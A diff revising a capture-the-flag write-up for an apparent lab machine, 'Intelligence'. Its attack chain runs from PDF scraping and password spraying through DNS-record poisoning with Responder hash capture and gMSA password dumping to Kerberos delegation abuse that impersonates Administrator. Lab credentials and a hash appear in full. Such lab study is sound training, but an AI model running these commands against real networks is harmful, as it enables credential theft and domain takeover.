@@ -70,10 +70,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-- No anonymous bind on LDAP
-- Can't list the share as guest
-
-A `/documents` directory on the web server holds `uploaded.pdf` — files follow a **date-based** naming schema, visible in the page source:
+No anonymous bind on LDAP, and the share won't list for guest access. A `/documents` directory on the web server holds `uploaded.pdf` — files follow a **date-based** naming schema, visible in the page source:
 
 ```html
 <a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">Download</a>
@@ -81,55 +78,43 @@ A `/documents` directory on the web server holds `uploaded.pdf` — files follow
 <a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">Download</a>
 ```
 
-- Directory listing is 403 — download them instead with a one-liner:
+Directory listing is 403, so download them instead with a one-liner:
 
 ```sh
 d=2020-01-01; while [ "$d" != "$(date -I)" ]; do echo "http://10.10.10.248/Documents/$d-upload.pdf"; d=$(date -I -d "$d + 1 day"); done | xargs -n 1 -P 20 wget -q 2>/dev/null
 ```
 
 ---
-- `d=2020-01-01` — Sets the starting date variable to January 1, 2020
-
-- `while [ "$d" != "$(date -I)" ]` — Loops while the date variable doesn't equal today's date
-
-- `do` — Starts the loop block
-- `echo "http://10.129.95.154/Documents/\$d-upload.pdf"` — Prints a URL for each date (e.g., 2020-01-01-upload.pdf, 2020-01-02-upload.pdf, etc.)
-- `d=$(date -I -d "$d + 1 day")` — Increments the date by one day for the next iteration
-- `done` — Ends the loop block
- 
-- `xargs -n 1 -P 20 wget -q` — Takes each URL and downloads it with wget, using 20 parallel processes (-P 20), one URL at a time (-n 1), in quiet mode (-q)
+Breaking down the one-liner: `d=2020-01-01` sets the starting date to January 1, 2020, and the `while` loop keeps running until the date variable reaches today's date. Each iteration prints a URL for the current date — for example `2020-01-01-upload.pdf`, `2020-01-02-upload.pdf` — then increments the date by one day. `done` ends the loop block, and `xargs -n 1 -P 20 wget -q` takes each URL and downloads it with wget in quiet mode, one URL at a time, using 20 parallel processes.
 ---
 > **Note**: `xargs` is a command that takes input and converts it into arguments for another command.
 ---
 
-Extract **usernames** from the pdf **meta-data** with `exiftool`:
+Extract the **usernames** from the PDF **metadata** with `exiftool`:
 
 ```sh
 exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
 ```
 
-One more one-liner converts **pdf** files **to text** using the binary `pdftotext`:
+Another one-liner converts the **PDF** files **to text** using the `pdftotext` binary:
 
 ```sh
 for f in *pdf; do pdftotext $f; done
 ```
 
-Then scan the **header** of every converted **text** file:
+Then scan the **header** line of every converted **text** file:
 
 ```sh
 head -n1 *txt
 ```
 
-Two files stood out — everything else was random latin words. Reviewing both explains why guest can't read the share, and hands over the machine's default password. Brute the userlist with `nxc` against it:
+Two files stood out — everything else was random Latin words. Reviewing both explains why guest can't read the share and hands over the machine's default password. Brute the userlist against it with `nxc`:
 
 > `Tiffany.Molina - NewIntelligenceCorpUser9876`
 
 # User
 
-**Users** & **IT** share are readable by **Tiffany.Molina**.
-
-- **Users** holds her home directory — user flag in hand
-- **IT** holds a **powershell script** that loops through DNS records and sends an authenticated request to any host whose name starts with **web**, to check its status
+The **Users** and **IT** shares are readable by **Tiffany.Molina**. **Users** holds her home directory — user flag in hand. **IT** holds a **PowerShell script** that loops through DNS records and sends an authenticated request to any host whose name starts with **web** to check its status.
 
 We can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone — **add a new record that points** to our own IP using `dnstool.py`:
 
@@ -137,7 +122,7 @@ We can leverage the permission (granted by default to authenticated users) to cr
 dnstool -u 'INTELLIGENCE\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r web1 -d 10.10.16.82 10.129.95.154
 ```
 
-Listener up to catch the **ntlm-hash** the moment the script runs (NTLM-relay):
+Listener up to catch the **NTLM hash** the moment the script runs (NTLM relay):
 
 ```sh
 responder -i tun0
@@ -155,8 +140,7 @@ bloodhound-python -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -ns 10.129.95.
 
 # Root
 
-- `Ted.Graves` is a member of the **itsupport group**
-- **itsupport** has `ReadGMSAPassword` over `svc_int`
+`Ted.Graves` is a member of the **itsupport group**, and **itsupport** has `ReadGMSAPassword` over `svc_int`.
 
 > https://github.com/micahvandeusen/gMSADumper
 
@@ -166,22 +150,19 @@ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
 
 That yields the **NT hash** of `svc_int`, which has **AllowedToDelegate** over the **DC**.
 
-The clock skew is too great — Kerberos tickets (K-T-T) are timing sensitive, so wrap the impacket calls with **faketime**. The nmap scan already told us the skew:
-
-- Check the nmap scan for clock-skew time
-- The **FQDN** revealed while dumping the `svc_int` hash is `dc` — add `dc.intelligence.htb` to `/etc/hosts`
+The clock skew is too great — Kerberos tickets (K-T-T) are timing sensitive, so wrap the impacket calls with **faketime**. The nmap scan already told us the skew, and the **FQDN** revealed while dumping the `svc_int` hash is `dc` — add `dc.intelligence.htb` to `/etc/hosts`:
 
 ```sh
 faketime 'now -16 hours -56 minutes -12 seconds' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'intelligence.htb/svc_int' -hashes ':4de450f51af61cf1e67e982965aca00c'
 ```
 
-- Rename the **ccache** to `Administrator.ccache` and point Kerberos at it:
+Rename the **ccache** to `Administrator.ccache` and point Kerberos at it:
 
 ```sh
 export KRB5CCNAME=Administrator.ccache
 ```
 
-- **wmiexec** logs in easier than the other tools:
+**wmiexec** logs in easier than the other tools:
 
 ```sh
 faketime 'now -16 hours -56 minutes -12 seconds' impacket-wmiexec -k -no-pass dc.intelligence.htb 
